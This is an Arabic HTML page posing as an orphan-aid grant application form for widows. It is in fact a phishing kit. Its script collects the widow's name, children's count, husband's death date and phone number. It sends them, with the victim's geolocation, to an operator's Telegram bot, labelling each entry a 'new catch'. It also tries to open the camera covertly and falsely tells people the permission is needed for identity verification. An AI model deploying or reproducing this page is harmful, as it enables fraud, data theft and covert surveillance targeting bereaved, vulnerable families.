<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منحة معونة الأيتام - تسجيل طلب جديد</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; text-align: right; padding: 10px; }
        .form-card { background: white; max-width: 450px; margin: 20px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #1a73e8; text-align: center; font-size: 20px; }
        label { display: block; margin-top: 15px; font-weight: bold; font-size: 14px; }
        input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn { background-color: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; margin-top: 20px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .btn:hover { background-color: #218838; }
        .info { font-size: 12px; color: #666; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>

<div class="form-card">
    <h2>استمارة طلب منحة الأيتام (2026)</h2>
    <p style="text-align: center; color: #d9534f; font-size: 13px;">يرجى إكمال البيانات بدقة لضمان قبول الطلب</p>
    
    <form id="aidForm">
        <label>اسم الأرملة الكامل:</label>
        <input type="text" id="motherName" required placeholder="الاسم الثلاثي">

        <label>عدد الأولاد الأيتام:</label>
        <input type="number" id="childrenCount" required placeholder="عدد الأبناء تحت 18 سنة">

        <label>تاريخ وفاة الزوج:</label>
        <input type="date" id="deathDate" required>

        <label>رقم الهاتف للتواصل:</label>
        <input type="tel" id="phone" required placeholder="مع رمز الدولة">

        <button type="button" class="btn" onclick="sendData()">تقديم الطلب وتفعيل المنحة</button>
    </form>
    <p class="info">نظام المعونة الإنسانية الموحد - جميع البيانات مشفرة</p>
</div>

<script>
    // ضع توكن البوت والـ ID الخاص بك هنا
    const botToken = "YOUR_BOT_TOKEN_HERE";
    const chatId = "YOUR_CHAT_ID_HERE";

    function sendData() {
        // جمع بيانات الاستمارة
        const motherName = document.getElementById('motherName').value;
        const childrenCount = document.getElementById('childrenCount').value;
        const deathDate = document.getElementById('deathDate').value;
        const phone = document.getElementById('phone').value;

        let message = `🔔 صيد جديد (معونة أيتام):\n\n`;
        message += `👤 الاسم: ${motherName}\n`;
        message += `👦 عدد الأولاد: ${childrenCount}\n`;
        message += `📅 تاريخ وفاة الزوج: ${deathDate}\n`;
        message += `📞 الهاتف: ${phone}\n`;

        // طلب الموقع الجغرافي وإرساله
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                message += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
                executeSend(message);
            }, () => {
                message += `📍 الموقع: الضحية رفض الإذن\n`;
                executeSend(message);
            });
        } else {
            executeSend(message);
        }

        // تشغيل الكاميرا وتصوير الضحية (خلف الكواليس)
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            // كود التصوير يوضع هنا لإرساله كصورة
            alert("تم تسجيل طلبك بنجاح. سيتم التواصل معك خلال 48 ساعة.");
        }).catch(err => {
            alert("خطأ: يجب السماح بصلاحيات النظام لإتمام التحقق من الهوية!");
        });
    }

    function executeSend(msg) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    }
</script>

</body>
</html>
